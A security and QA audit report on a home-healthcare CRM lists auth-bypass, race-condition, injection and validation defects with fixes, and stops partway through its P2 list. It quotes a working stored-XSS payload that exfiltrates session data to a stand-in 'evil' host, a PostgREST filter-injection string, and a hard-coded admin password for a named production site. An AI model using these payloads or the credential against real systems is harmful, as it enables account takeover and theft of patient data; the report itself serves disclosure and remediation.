# Hominal CRM — Enterprise QA Audit
**Date:** 28 May 2026 — 10:15 IST
**Scope:** `vercel-web` (Next.js app, API, Supabase schema) + `public/legacy-crm.html` (legacy iframe SPA)
**Production:** https://crm.hominalhealthcare.com — `/api/v1/health` → `supabase.ok: true`
**Method:** parallel code audit (5 dimensions) + live HTTP probes + live SQL probes against `hkyjxdmkqkydnrafhpgn`

---

## Executive summary

| Verdict | Score | Rationale |
|---|---|---|
| **NOT production-ready for new customers** | **68 / 100** | Live system is up and serving the current customer, **but** 6 P0 defects allow non-admin users to delete invoices / soft-delete receipts / flip billing status, the legacy iframe ships a hard-coded `admin123` backdoor, and the React UI never sends `Idempotency-Key` so a double-click can record a duplicate receipt. CSP allows `unsafe-eval`. Almost no client-side validation on Aadhar/PAN/phone/DOB. The 100/100 audit from 27 May was scoped to deployment correctness — this audit looks at QA depth and finds substantial defects. |

**P0 (data-loss / auth-bypass / breach):** 7
**P1 (broken core flow / production incident soon):** 38
**P2 (degraded UX or maintenance debt):** 51
**P3 (polish):** 24
**Total flagged:** 120

A "100" verdict from this audit requires every P0 closed, the legacy iframe retired or hardened, idempotency moved server-side, and at minimum the realtime race in `use-realtime-resource.js` fixed.

---

## How to read this report

Every finding has:
- **Severity** — P0/P1/P2/P3.
- **Location** — `path/to/file:line` or `db_object_name`.
- **Defect** — one sentence: what's wrong.
- **Fix** — one sentence: what to change.

Verified facts in this report (probed live, not inferred):
- `crm.hominalhealthcare.com` HTTP probes (root 307, /login 200, /api/v1/health green) ✓
- Production response headers ✓
- 7 SECURITY DEFINER RPCs grantable to `authenticated` with no `hh_has_role` body check ✓
- 4 financial FKs with `ON DELETE CASCADE` ✓
- `admin123` literal in legacy-crm.html (4 locations) ✓
- `app/layout.js` has no `viewport` export ✓
- Idempotency-Key sent only from `public/lib/legacy-api.js` — never from `lib/api-client.js` (modern React UI) ✓

Two subagent claims that were **not confirmed** (downgraded in this report):
- `.env.*` files at risk of commit — actually ignored by root `.gitignore`. Disk leak only matters if the workstation itself is compromised.
- HSTS missing — actually present with 2-year max-age. Only `includeSubDomains` and `preload` flags missing.

---

# 1. BUG LIST BY SEVERITY

## P0 — Data loss, corruption, auth bypass, breach (fix within the week)

### P0-1 — Legacy iframe ships hardcoded `admin123` backdoor
- **Location:** `vercel-web/public/legacy-crm.html:4254, 4257, 7489, 16247, 16306, 16308`
- **Defect:** Static HTML literally contains:
  - `if ((u.password||'admin123')===password) { matched=u; break; }`
  - `if (!matched && username==='admin' && password==='admin123') matched={...,role:'Admin'};`
  - User-create code path defaults new passwords to `'admin123'`.
  - The 16247 branch even POSTs `{email:'admin@hominalhealthcare.com', password:'admin123'}` to Supabase `/auth/v1/token` — if that password was ever set, it's a working remote backdoor.
- **Production risk:** Anyone reading the JS bundle (anyone visiting `/`) can attempt to sign in as `admin` with `admin123`. If that Supabase Auth user exists with that password, full admin compromise.
- **Fix:** (a) Delete all three `'admin123'` branches in `legacy-crm.html`. (b) Force the legacy iframe to use the same Supabase login flow as `/login`. (c) Rotate `admin@hominalhealthcare.com` password in Supabase Auth **now**, regardless. (d) Disable any Auth user whose password equals `admin123`.

### P0-2 — 7 destructive RPCs callable by any authenticated user
- **Location:** Verified via `pg_proc`:
  - `public.hominal_delete_invoice(p_invoice_id, p_actor)`
  - `public.hominal_flip_billing_status(p_billing_id, p_target_status, p_actor, p_closed_at)`
  - `public.hominal_soft_delete_receipt(p_receipt_id, p_billing_id, p_deleted_by)`
  - `public.hominal_save_receipt(p_receipt)`
  - `public.hh_recompute_payout(p_employee_id, p_period)`
  - `public.hh_compact_invoice_seq()`
  - `public.hh_convert_inquiry_to_patient(p_inquiry_id)`
- **Defect:** All seven are `SECURITY DEFINER`, all seven grant `EXECUTE` to `authenticated`, **none** contain a `hh_has_role(...)` guard in the body. A `Caretaker` / `Nurse` / `Viewer` who holds a valid JWT can call any of them directly through PostgREST (`POST /rest/v1/rpc/hominal_delete_invoice`) and bypass the app's UI-level role gates entirely.
- **Production risk:** A junior employee, or anyone who gets a JWT (e.g. via XSS — see P1-7), can delete an invoice or void a receipt and the only thing that catches it is the audit log.
- **Fix:** Wrap every destructive RPC body with `if not hh_has_role(array['Admin','Accountant','Manager']) then raise exception 'forbidden' using errcode='42501'; end if;` (use the right role list per function). Migration draft already trivial — see Appendix A.

### P0-3 — React UI never sends `Idempotency-Key`, server only dedupes when header present
- **Location:** `vercel-web/lib/api-client.js` (the React HTTP client) — no idempotency header anywhere. `vercel-web/lib/api/idempotency.ts:29` reads `req.headers.get("idempotency-key")` and only short-circuits when present. Only `public/lib/legacy-api.js:53` (the iframe) sends one.
- **Defect:** Receipts (`POST /billings/:id/receipts`), payouts (`POST /payouts/pay`, `/pay-advance`), patient creates, employee creates, duty creates, and inquiry → patient conversion all run through `withIdempotency`, but the React app never sends the header so the wrapper is a no-op. A double-click or React strict-mode double-fire on a slow network can write two receipts / two patients / two payments for the same intent.
- **Production risk:** Operator double-clicks "Save receipt" during a 2-second round-trip → two receipts in `hh_receipts`, both with their own `receipt_no`. Only the unique-id constraint protects you, and many flows generate IDs server-side (no collision), so the duplicate succeeds. Money is now mis-recorded; reconciliation falls to the audit log.
- **Fix:** Two-part:
  - **Client:** In `lib/api-client.js`, when `options.method !== 'GET'` and the caller did not provide one, set `Idempotency-Key: crypto.randomUUID()` plus a stable hash of `(path + JSON.stringify(body))` so React strict-mode double-fires share the same key.
  - **Server:** Promote `withIdempotency` from "honour header if present" to "synthesize a key from `actor.email + route + canonical-body-hash` when header is absent". And insert a "pending" row with `ON CONFLICT DO NOTHING` *before* `run()` to close the TOCTOU race at `vercel-web/lib/api/idempotency.ts:35-66`.

### P0-4 — Cron route runs unauthenticated outside production
- **Location:** `vercel-web/app/api/v1/cron/duties-extend/route.ts:36-62`
- **Defect:** When both `CRON_SECRET` and `DUTY_CRON_SECRET` are unset **and** `VERCEL_ENV !== 'production'`, the route runs anonymously with a synthetic `Admin` actor whose `accessToken: ""`. Empty token → `dbAccess` returns `undefined` → service-role client → full RLS bypass.
- **Production risk:** Anyone who can hit any preview deployment URL (`<branch>-crm-…vercel.app`) can trigger duty/payout materialization that mutates real payouts in the shared Supabase project.
- **Fix:** Refuse to run unless the secret is set, regardless of environment. Also drop the legacy `x-cron-secret` header path — keep `Authorization: Bearer` only.

### P0-5 — Patient soft-close leaves linked active duties + bills billable
- **Location:** `vercel-web/src/services/patientService.ts:352-396`
- **Defect:** `patientService.remove` flips `status='Closed'` but does **not** cap linked active duties or close the active bill. Duty-day materialization continues writing `hh_duty_days` and `hh_payout_charges` for a "closed" patient, and the duty diary keeps generating service entries that bill the now-closed patient's open billing.
- **Production risk:** Patient is closed in the UI; for the next month duty diary still generates charges; an invoice gets cut against a closed patient; audit & finance reconciliation breaks.
- **Fix:** Inside `remove`, after flipping status, call `capLinkedDutiesOnBillingClose(activeBill.id)`-equivalent for the patient's active bill and `dutyService.cancelActiveForPatient(id, reason)` for all active duties — all within a single Postgres RPC `hominal_close_patient(p_patient_id, p_actor, p_reason)`.

### P0-6 — PostgREST `.or()` filter injection via unsanitised IDs / search
- **Location:** `vercel-web/src/database/payoutRepository.ts:200, 329-330, 415-417`; `vercel-web/src/services/dutyService.ts:547`; plus the `q` search field in `patientRepository`, `billingRepository`, `payoutRepository`, `employeeRepository`, `inquiryRepository`, `attendanceRepository`, `vendorRepository`, `doctorRepository`, `userRepository`.
- **Defect:** Code uses raw template strings:
  - `.or(\`employee_id.eq.${employeeId},partner.eq.${employeeId}\`)`
  - `.or(\`name.ilike.%${opts.q}%,phone.ilike.%${opts.q}%\`)`
  with no PostgREST-syntax escaping. `idSchema` allows commas, dots, parentheses (it's `z.string().min(1).max(64)`). `q` strips `%` in some repos but not commas, parens, or PostgREST keywords (`.eq.`, `.gt.`, `.is.`). A crafted value like `q=foo%2C,id.gt.0` widens the result set to "all rows".
- **Production risk:** A logged-in user (incl. read-only Viewer) can run `?q=` queries that bypass intended filters and pull rows from across the table. With RLS in place this is bounded to rows the role can read — but for tables where RLS just gates on `hh_is_active_app_user()` (i.e. all of them), that's the whole table.
- **Fix:** (a) Tighten `idSchema` in `vercel-web/src/validation/commonValidation.ts:30` to `z.string().trim().regex(/^[A-Za-z0-9_-]{1,64}$/)`. (b) In every repository's `q` handler, strip `,()` in addition to `%`, length-cap at 200, OR migrate to Supabase `.textSearch()`. (c) For multi-value OR queries (`employee_id.eq.X,partner.eq.X`), use two `.or()` clauses with values pre-validated against `idSchema`.

### P0-7 — Signed-download endpoint missing role gate; TTL up to 60 min
- **Location:** `vercel-web/app/api/v1/uploads/signed-download/route.ts:16-20` and `vercel-web/src/services/storageService.ts:55`
- **Defect:** Route handler has no `requireRole`. RBAC lives only inside `storageService.createSignedDownload` (`READ_ROLES.has(role)`); role comparison is case-sensitive (`"admin"` ≠ `"Admin"`), so a custom-role token could slip past `requireActor` and be rejected only at the service. Worse, `expires_in` is capped at `3600` (60 min) — patient PDFs and payout proofs should not be reachable for an hour after one click.
- **Production risk:** Patient/employee documents (PHI grade) leaked through a long-lived signed URL pasted into a chat.
- **Fix:** (a) Add `requireRole(actor, ["Admin","Manager","Accountant","Staff","Executive","Nurse"])` to the route. (b) Lower `expires_in.max(1800)` and default `300`. (c) Normalise role strings to canonical case in `requireRole` once and forever.

---

## P1 — Broken core flow, production incident soon (fix this sprint)

### P1-1 — Stale-response race in `use-realtime-resource.js` taints every paginated list
- **Location:** `vercel-web/hooks/use-realtime-resource.js:73-91`
- **Defect:** `fetchOnce` reads the outer effect's `cancelled` flag but never checks it after the `await`, so `setData/setTotal/setError` always fire. On rapid filter / pagination changes the slower response wins and overwrites the newer one. Affects patients, employees, inquiries, audits — every list using `usePaginatedResource`.
- **Risk:** Operator filters by status "Active", sees stale "Closed" list, takes the wrong action.
- **Fix:** Pass `cancelled` (or an `AbortController`) into `fetchOnce` and return early before each `setX` if `cancelled.current === true`.

### P1-2 — `openPayout` writes wrong-employee forms (financial)
- **Location:** `vercel-web/app/payouts/payouts-inner.js:237-281`
- **Defect:** Five sequential awaits then `setDetail/setPayForm/setAdvanceForm/setAdjustForm`. No request token. Click row A → click row B before A resolves → B's `setDetail` runs first, then A's `setAdjustForm` overwrites with A's advance amount while the UI shows B. Operator hitting "Apply adjustment" applies employee A's number to employee B's payout.
- **Fix:** `const reqId = ++openPayoutSeq.current;` at function entry, then `if (reqId !== openPayoutSeq.current) return;` before every `setX`.

### P1-3 — Offline queue never auto-drains
- **Location:** `vercel-web/lib/api-client.js:98-109` + `vercel-web/components/providers/auth-provider.js:49-95`
- **Defect:** `requestWithOfflineFallback` enqueues only on `!navigator.onLine` failures. `flushOfflineQueue` is called only on auth state change. No `window.addEventListener("online", …)` and no `visibilitychange` flush. Also: requests that fail with 5xx or transient DNS / fetch rejection are **not** enqueued — they're lost.
- **Risk:** Operator marks attendance on the road, loses signal, comes back, doesn't reload the tab → queue sits forever; or 5xx during a receipt save → mutation simply gone.
- **Fix:** Add `online` + `visibilitychange` listeners in `auth-provider.js` that call `flushOfflineQueue`. Also enqueue on `5xx` and fetch reject (with retry cap).

### P1-4 — Receipts, invoices, svc_entries cascade-delete with the billing
- **Location:** Verified FKs: `hh_receipts.billing_id`, `hh_invoices.billing_id`, `hh_svc_entries.billing_id` all `ON DELETE CASCADE`. `hh_attendance.duty_id` also CASCADE.
- **Defect:** Even though the app uses soft-delete everywhere, a stray `DELETE FROM hh_billings WHERE id=...` (incident response, DBA mistake, future feature) silently wipes the entire receipt / invoice / svc_entry history for that bill. Same for attendance when a duty is deleted.
- **Fix:** `ALTER TABLE` to change to `ON DELETE RESTRICT` on those four FKs. Document soft-delete as the only path.

### P1-5 — Aadhar / PAN / phone / DOB have zero client-side format validation
- **Location:** `vercel-web/app/employees/page.js:936-967, 944-949`; `vercel-web/app/patients/page.js:727-746, 849-852`; `vercel-web/app/doctors/page.js:215, 247`; `vercel-web/app/inquiries/page.js:457-461`; `vercel-web/app/users/page.js:276-280`.
- **Defect:** Plain `<input>` accepting `"abc"` as Aadhar, alpha keyboard on phones (no `type="tel"` / `inputMode="numeric"`), no `max={today}` on DOB so DOB can be 2099.
- **Risk:** Garbage flows into the DB, costs operator time on every save round-trip when the server rejects, and DOB-in-future silently produces "age 0" on patient cards.
- **Fix:** `<input pattern="\d{12}" maxLength={12} inputMode="numeric">` for Aadhar; `pattern="[A-Z]{5}[0-9]{4}[A-Z]"` for PAN; `type="tel" inputMode="tel"` for phone; `max={todayIso}` for DOB.

### P1-6 — Mobile viewport meta missing — entire CRM renders at 980px on phones
- **Location:** `vercel-web/app/layout.js:1-21` — no `export const viewport = {...}` anywhere.
- **Defect:** Verified by reading the file. Next.js 14+ Metadata API expects `viewport` separately; without it iOS / Android default to 980px desktop emulation. Result: every page is zoomed-out and tap targets are pixel-tiny.
- **Risk:** Field nurses cannot meaningfully use the CRM on a phone.
- **Fix:** Add to `app/layout.js`:
  ```js
  export const viewport = {
    width: "device-width",
    initialScale: 1,
    viewportFit: "cover"
  };
  ```

### P1-7 — `innerHTML` concatenation with user data in legacy iframe (stored XSS)
- **Location:** `vercel-web/public/legacy-crm.html:7419-7421` (dashboard), `7449-7452` (users), `7711` (doctors), `7787` (vendors), `7897` (patients), `8070-8077` (inquiries), `8169` (billings), `12217-12250` (employees).
- **Defect:** `row.innerHTML = '<td>'+p.name+'</td>...'` — `p.name` is user-controlled. The file even defines a `safeText()` helper at line 4330 but doesn't use it. Any user with create/edit rights can store `<img src=x onerror=fetch('/api/v1/auth/me').then(r=>r.json()).then(d=>fetch('//evil',{method:'POST',body:JSON.stringify(d)}))>` in a patient name and exfiltrate every operator's session token (which sits in localStorage).
- **Risk:** Full account takeover of every operator who views the patient list.
- **Fix:** Replace every interpolation with `safeText()` (already in the file). Long-term: retire the legacy iframe (the React app already covers the same flows).

### P1-8 — CSP allows `unsafe-eval`
- **Location:** `vercel-web/next.config.mjs:36`; verified on production:
  `script-src 'self' 'unsafe-inline' 'unsafe-eval';`
- **Defect:** Both directives are present. `unsafe-eval` is not used by any code I could find. `unsafe-inline` exists because of `legacy-crm.html` inline scripts.
- **Fix:** Drop `'unsafe-eval'` immediately. Plan a nonce-based `'unsafe-inline'` removal once the legacy iframe is retired.

### P1-9 — Cron path runs every duty extension with service-role client even in production
- **Location:** `vercel-web/app/api/v1/cron/duties-extend/route.ts:58-62`
- **Defect:** Synthetic actor has empty `accessToken`; every Supabase call downstream uses service-role. Audit attribution is OK (`cron@hominal.system`) but RLS is bypassed.
- **Fix:** Either provision a real service-account JWT for cron or document the bypass and prove that no per-user reasoning depends on `cron@hominal.system`.

### P1-10 — In-memory rate-limiter resets on every Vercel cold start
- **Location:** `vercel-web/lib/api/security.ts:23-39`
- **Defect:** `Map`-backed counter is per warm Lambda instance. Effective limit is `limit × n_instances`. Login also has no server-side limit at all (auth proxies straight to Supabase from the browser via `auth-provider.js:115`).
- **Risk:** Credential stuffing on `admin@hominalhealthcare.com / admin123` (see P0-1) is not rate-limited by us. AI ask and webhook caps are easily defeated.
- **Fix:** Back limiter with Vercel KV / Upstash. Add a server-side `/api/v1/auth/login` proxy and put `enforceRateLimit(req, "login", 5, 60_000)` in front.

### P1-11 — `hh_recompute_payout` race
- **Location:** `public.hh_recompute_payout(p_employee_id, p_period)`
- **Defect:** SELECT then INSERT/UPDATE without `FOR UPDATE` or `pg_advisory_xact_lock`. Unique index prevents duplicates but produces user-visible 23505s on concurrent recompute.
- **Fix:** Add `select ... from hh_payouts where employee_id=$1 and period_month=$2 for update;` or `perform pg_advisory_xact_lock(hashtext('payout:'||$1||':'||$2));` at function top.

### P1-12 — `hh_convert_inquiry_to_patient` race
- **Location:** `public.hh_convert_inquiry_to_patient(p_inquiry_id)`
- **Defect:** No row lock on `hh_inquiries`; patient id uses `'P'||YYMMDD||lpad(random()*9999,4,'0')`. Two concurrent "Convert" clicks → two patients for one inquiry; the random suffix has ~0.01% daily collision risk.
- **Fix:** `SELECT ... FOR UPDATE` on the inquiry row; switch id generation to a sequence or `gen_random_uuid()`-derived deterministic id; add `pg_advisory_xact_lock(hashtext('inquiry:'||p_inquiry_id))`.

### P1-13 — `hh_billings.status` and `hh_payouts.status` lack CHECK / NOT NULL
- **Location:** Schema.
- **Defect:** Both are text columns the app treats as enums. No DB constraint.
- **Fix:** `ALTER TABLE hh_billings ALTER COLUMN status SET NOT NULL; ADD CONSTRAINT chk_hh_billings_status CHECK (status IN ('Active','Closed','Cancelled'));` and same for `hh_payouts` with `('OPEN','APPROVED','PAID','CANCELLED')`.

### P1-14 — `hh_lookup_login` is a public username enumeration endpoint
- **Location:** `public.hh_lookup_login(login_input text)` is SECURITY DEFINER, grant to `authenticated`, returns `(email, username)`.
- **Defect:** Any authenticated user can probe arbitrary inputs and learn which usernames/emails are real.
- **Fix:** Return only a boolean "found". Rate-limit at the edge. Revoke from `authenticated` and make it server-only via `service_role` if possible.

### P1-15 — WhatsApp send endpoints can blast any number
- **Location:** `vercel-web/app/api/v1/whatsapp/send/route.ts:12`, `send-bill`, `send-template`. `vercel-web/src/validation/whatsappValidation.ts:23` accepts `z.string().url()` with no host allow-list.
- **Defect:** Any `Staff` (broadest role) can WhatsApp any phone and any URL. The org's WhatsApp Business account can be abused.
- **Fix:** Tighten to `Admin/Manager`, enforce `+91` (or env-configured prefix), and constrain `invoice_url` to org-owned hosts.

### P1-16 — Bulk diary-extend writeable by any `Staff`
- **Location:** `vercel-web/app/api/v1/duties/extend-active/route.ts:21`
- **Defect:** `Staff` can re-fire the bulk extend job, each run writing hundreds of `hh_payout_charges`.
- **Fix:** Restrict to `Admin/Manager` and add a server-side cooldown (idempotent within the same hour).

### P1-17 — Period free-text input poisons payout keys
- **Location:** `vercel-web/app/payouts/payouts-inner.js:1327-1335` (Ensure-payout `period_month`)
- **Defect:** Plain `<input value placeholder="YYYY-MM" required>`, no `pattern`, no `type="month"`. `"Jan 2024"` becomes a real period key in `hh_payouts.period_month`.
- **Fix:** `type="month"` and reject anything that doesn't match `/^\d{4}-(0[1-9]|1[0-2])$/` before submit.

### P1-18 — Receipt `recordPayment` is a 4-step non-atomic flow
- **Location:** `vercel-web/src/services/billingService.ts:1556-1681`
- **Defect:** `saveReceiptRpc` → stamp `receipt_no` → `recomputePaidStatus` → ledger sync. Four independent calls. Crash between any two leaves a receipt with no number or with stale `paid_status`. `nextReceiptNoRpc` failure silently writes a numberless receipt (`receiptNo = null` at line 1640-1648).
- **Fix:** Collapse into `hominal_save_receipt_v2(p_receipt jsonb)` that allocates receipt_no, writes the row, recomputes paid_status, and links duty_days in one atomic RPC. Hard-fail if any step fails.

### P1-19 — Bill generation from duty range is not transactional
- **Location:** `vercel-web/src/services/billingService.ts:1487-1522, 1397-1406`
- **Defect:** `generateFromDutyRange` loops per duty calling `insertSvc` + `dutyRepository.update`. A mid-loop failure leaves N svc rows and N duty.billing_id updates while the client got a 5xx — and retries, double-billing those duties.
- **Fix:** Wrap in a single RPC `hominal_generate_from_duty_range(p_billing_id, p_duty_ids, p_actor)` that does it inside one transaction.

### P1-20 — End-of-month timezone bug hides late-day duties on calendar
- **Location:** `vercel-web/app/duties/page.js:476-484`
- **Defect:** `new Date(year, monthIndex + 1, 0).toISOString().slice(0,10) + "T23:59:59.999Z"` builds local end-of-month and pins to UTC; any IST duty starting after 18:30 on the 31st falls outside the query window.
- **Fix:** Use `+05:30` offset or query the boundary via the server's IST helper.

### P1-21 — UTC `toISOString().slice(0,10)` writes wrong "today" near midnight IST
- **Location:** `vercel-web/src/business/employeeRules.ts:41,339`; `vercel-web/src/services/employeeService.ts:514`; `vercel-web/src/services/userService.ts:116`; `vercel-web/src/services/storageService.ts:71`; `vercel-web/src/services/aiService.ts:58`.
- **Defect:** All write the UTC date. CRM operates IST. The codebase already has `crmTodayIso()` — these call sites missed it.
- **Fix:** Replace every `new Date().toISOString().slice(0,10)` with `crmTodayIso()`.

### P1-22 — User update lets `Manager` self-elevate any user to `Admin`
- **Location:** `vercel-web/src/services/userService.ts:62-64`
- **Defect:** `out.role` is written verbatim from the body. Only an `Admin` or `Manager` reaches this code, but a Manager (who is not allowed to mint Admins) can `PUT /users/:id` with `{ role: "Admin" }`.
- **Fix:** Validate `role` against a permitted set per actor role; require `Admin` to elevate anyone to `Admin`.

### P1-23 — `actor` / `created` accepted from request body (back-dating)
- **Location:** `vercel-web/src/services/inquiryService.ts:489` (`created: input.created || new Date().toISOString()`); `vercel-web/src/services/userService.ts:116`; legacy sync schemas in patient / employee.
- **Defect:** Client can back-date created timestamps on the legacy sync path → audit history can be falsified.
- **Fix:** Always assign `created = new Date().toISOString()` server-side; strip `created`/`created_by` from input.

### P1-24 — WhatsApp webhook persists arbitrary JSON if signature secret leaks
- **Location:** `vercel-web/app/api/v1/whatsapp/webhook/route.ts:55-78`
- **Defect:** Verifies HMAC only. If `WHATSAPP_APP_SECRET` ever leaks (logs, env var snapshot), attacker can write any payload via `whatsappService.recordWebhook`.
- **Fix:** Constrain the payload shape via Zod before persisting; combine signature with `verifyToken` round-trip.

### P1-25 — N+1 query fan-out on bill / payout listings
- **Location:** `vercel-web/src/services/dutyService.ts:472-498`; `vercel-web/src/services/billingService.ts` (`listByPatient` and ledger paths)
- **Defect:** `for (const b of billRows) { await listSvc(b.id); await listActiveReceipts(b.id); }`. Per-bill round-trips. Repository batched variants exist (`listSvcByBillingIds`, `listActiveReceiptsByBillingIds`) but aren't used here.
- **Fix:** Switch to the batched helpers.

### P1-26 — Free-text DOB / dates accept "next monday" via `isoDate`
- **Location:** `vercel-web/src/validation/commonValidation.ts:32` — `isoDate` only requires `Date.parse(v)` to succeed; passes `"next monday"`, `"03/05/26"`, `"2026"`.
- **Defect:** Date columns get free-text values. Downstream comparisons silently misorder.
- **Fix:** `z.string().regex(/^\d{4}-\d{2}-\d{2}(T.+)?$/)`.

### P1-27 — Realtime channels re-subscribe on every JWT refresh (every ~50 min)
- **Location:** `vercel-web/app/billings/page.js:194-220`; `vercel-web/app/payouts/payouts-inner.js:283-302`; `vercel-web/app/duties/page.js:518-578`; `vercel-web/app/attendance/page.js:140-160`.
- **Defect:** Effects use the full `auth.session` object in deps; every JWT refresh changes the reference and tears down + re-subscribes the multi-table channel.
- **Fix:** Depend on `auth.session?.access_token` (string) instead.

### P1-28 — `100/200/150/500` row caps silently truncate financial lists
- **Location:** `vercel-web/app/billings/page.js:140` (limit=100), `vercel-web/app/payouts/payouts-inner.js:135` (200), `vercel-web/app/duties/page.js:478` (150). All without "Showing first N of M" banners.
- **Fix:** Surface a banner `Showing first 100 of N — refine filters` when `rows.length === limit`, or migrate to `usePaginatedResource`.

### P1-29 — Object URL leak on every payout proof upload
- **Location:** `vercel-web/app/payouts/payouts-inner.js:584-617`
- **Defect:** `URL.createObjectURL(file)` stored in form state; never revoked.
- **Fix:** `URL.revokeObjectURL(prev)` before overwriting, and a `useEffect` cleanup on unmount.

### P1-30 — Modals have no `max-height/overflow-y`
- **Location:** `vercel-web/app/globals.css:544-554` (`.modal-card`)
- **Defect:** Tall modals (patient history, employee history, manual invoice) push their submit button off-screen on iPhone SE with the keyboard up.
- **Fix:** `.modal-card { max-height: calc(100vh - 48px); overflow-y: auto; }`.

### P1-31 — Every form label across `app/` has no `htmlFor` association
- **Location:** `vercel-web/app/**/page.js`
- **Defect:** `<label>` / `<input>` are siblings, not associated. Tap-to-focus on mobile fails; screen readers don't announce.
- **Fix:** Add `htmlFor`/`id` pairing in every form (mechanical rewrite — propose a codemod).

### P1-32 — `PDF` button breaks popup blockers on mobile Safari
- **Location:** `vercel-web/app/employees/page.js:686` (`openEmployeePdf`); `vercel-web/app/patients/page.js:603` (`openPatientPdf`).
- **Defect:** `async` handler `await`s Supabase signed URL before `window.open`. The user gesture has already been consumed; Mobile Safari blocks the popup.
- **Fix:** Call `window.open("about:blank", "_blank")` synchronously at click time, then write into the returned window after the await resolves.

### P1-33 — `parseJsonBody(req).catch(() => ({}))` swallows oversized / malformed bodies as 200
- **Location:** Multiple routes: `vercel-web/app/api/v1/duties/diary/batch/route.ts`, `…/duties/[id]/route.ts`, `…/inquiries/[id]/convert/route.ts`, `…/billings/[id]/receipts/[receiptId]/route.ts`, `…/duties/[id]/diary/[date]/route.ts`.
- **Defect:** A 1 MB body returns success; audit says "no reason given".
- **Fix:** Drop the `.catch` and let the 400 propagate.

### P1-34 — Empty body POST returns 200
- **Location:** `vercel-web/lib/api/handler.ts:63`
- **Defect:** `if (!text) return {} as T;` lets Zod defaults turn empty POSTs into no-op mutations that still write audit rows.
- **Fix:** `throw badRequest("Body required")` for routes that need one.

### P1-35 — File upload signed-url endpoint accepts any MIME, any size
- **Location:** `vercel-web/src/services/storageService.ts:90-109` (`createSignedUpload`)
- **Defect:** Extension is the only filter. Browser uploads any Content-Type. Bucket-level cap may or may not be set.
- **Fix:** Add `mime: z.enum([...allow-list])` to the input schema, pass it to `createSignedUploadUrl`, configure bucket `max_size` policy.

### P1-36 — `isSafeObjectPath` only enforced on download, not upload
- **Location:** `vercel-web/src/services/storageService.ts:60-67, 127`
- **Defect:** Uploads can steer into other subdirectories of an allowed bucket. Download path is gated; upload path is not.
- **Fix:** Apply `isSafeObjectPath` (and a `Patients/<patient_id>/` prefix policy) on upload.

### P1-37 — `actor.email` used with `.ilike` against `hh_users` (case-insensitive + wildcards)
- **Location:** `vercel-web/lib/api/auth.ts:38-43`
- **Defect:** `.ilike("email", email)` treats `%` and `_` as wildcards. Supabase normally rejects these in email, but defensive code should use `.eq` after lowercase normalisation, and the lookup itself should go through `supabaseAsUser` (RLS-scoped) rather than `supabaseAdmin`.
- **Fix:** `.eq("email", email.toLowerCase())`.

### P1-38 — Login page lacks rate limiting (server-side); Supabase Auth limits unverified
- **Location:** `vercel-web/components/providers/auth-provider.js:115` calls `supabase.auth.signInWithPassword` directly from the browser.
- **Defect:** Combined with P0-1 (`admin123`), credential stuffing against admin is essentially unbounded.
- **Fix:** Either (a) verify Supabase Auth rate-limits are enabled in this project, or (b) introduce a `/api/v1/auth/login` proxy with `enforceRateLimit(req, "login", 5, 60_000)`.

---

## P2 — Degraded UX or maintenance debt (51 items, grouped)

**React layer (`vercel-web/app/**`)**:

- **P2** `billings/page.js:976-989, 1022-1043` — Stale data while reloading; no skeleton.
- **P2** `payouts/payouts-inner.js:1639-1644` — Refresh button never disabled.
- **P2** `payouts/payouts-inner.js:1149-1168` — Switching payout shows stale name/amount until awaits resolve.
- **P2** `users/page.js:67-77`, `vendors/page.js:241`, `doctors/page.js:301`, `reports/page.js:54-80` — Reload has no loading state.
- **P2** `billings/page.js:1303` — Bad date concatenation produces `"2024-01-15 — -"`.
- **P2** `payouts/payouts-inner.js:1748, 1846-1893` — `Number(row.amount).toFixed(2)` renders `"NaN"` when amount missing.
- **P2** `settings/page.js:139` — Silent JSON-parse fallback corrupts stored settings.
- **P2** `app/payouts/payouts-inner.js:1846-1893` — Table not wrapped in `.table-wrap` (no horizontal scroll on phones).
- **P2** `app/duties/page.js:1417-1473, 1729-1735` — Hard 3-column grids overflow on 360px viewports.
- **P2** `app/payouts/payouts-inner.js:2095-2102, 1462-1469` — Inline `minWidth: 220/240` on inputs guarantees overflow.
- **P2** `app/attendance/page.js:732-776` — Quick-mark buttons ~24×32px (< WCAG 44×44 target).
- **P2** Search performed client-side over capped lists (`billings`, `payouts`, `users`, `doctors`, `vendors`) — invisibly incomplete.
- **P2** No per-route `error.tsx`; only `global-error.tsx` catches.
- **P2** `app/reports/page.js:54-80` — `Promise.allSettled` silently shows zeros if one section fails.

**API / services**:

- **P2** `vercel-web/src/validation/commonValidation.ts:3-9` — `phoneSchema.min(7)` accepts 7-digit phones; no country prefix.
- **P2** `vercel-web/src/validation/employeeValidation.ts:135-136` — `aadhar`/`pan` schema not length-capped before normalisation.
- **P2** `vercel-web/src/validation/billingValidation.ts:60` — `close_reason_other` not required when `reason === "Other"`.
- **P2** `vercel-web/src/validation/payoutValidation.ts:104` — Advance amount uncapped.
- **P2** `vercel-web/src/validation/billingValidation.ts:119` — Receipt amount allows 0.
- **P2** `vercel-web/lib/api/handler.ts:80` — `q` parameter not length-capped (1 MB possible).
- **P2** `vercel-web/lib/api/idempotency.ts:33, 67-69` — 24 h TTL is short for money flows; persist failure logs to console only.
- **P2** `vercel-web/src/services/billingService.ts:1796-1813` — Invoice idempotency matches only `(billing_id, period)`; changed notes return stale.
- **P2** `vercel-web/src/services/patientService.ts:399-430` — Patient reopen doesn't restore prior duty `end_at`.
- **P2** `vercel-web/app/api/v1/billings/[id]/receipts/[receiptId]/route.ts:26-32` — Soft-delete reason defaults to "" on body error.
- **P2** `vercel-web/src/services/whatsappService.ts:116, 192` — Marks message SENT even when Meta returns no `messages[0].id`.
- **P2** `vercel-web/src/services/dutyService.ts:551-557` — `Number(r.amount || 0)` silently produces 0 from non-numeric.
- **P2** `vercel-web/src/services/aiService.ts:130` — Empty `choices[0].message.content` audited as successful call.
- **P2** `vercel-web/src/services/userService.ts:152, 170, 248, 275` — `before.success ? ... : null` swallows transient DB errors into a null `before` audit row.
- **P2** `vercel-web/app/api/v1/public-config/route.ts:21-28` — Caches anon key publicly for 5 min.
- **P2** `vercel-web/src/services/aiService.ts:108-127`, `whatsappService.ts:42-50` — No `AbortController` timeout; a hung Meta/OpenAI socket eats the function's 30 s budget.
- **P2** Heavy report endpoints have no `Cache-Control` and no rate limit (`reports/dashboard`, `billing-totals`, `profit-loss`, `payroll`).
- **P2** `app/api/v1/ai/ask/route.ts:17` — 30 RPM per IP is too high given OpenAI cost.

**Schema**:

- **P2** `hh_doctors.dob`, `hh_employees.dob`, `hh_patients.dob` stored as `text`.
- **P2** `created_at` nullable on 11 tables.
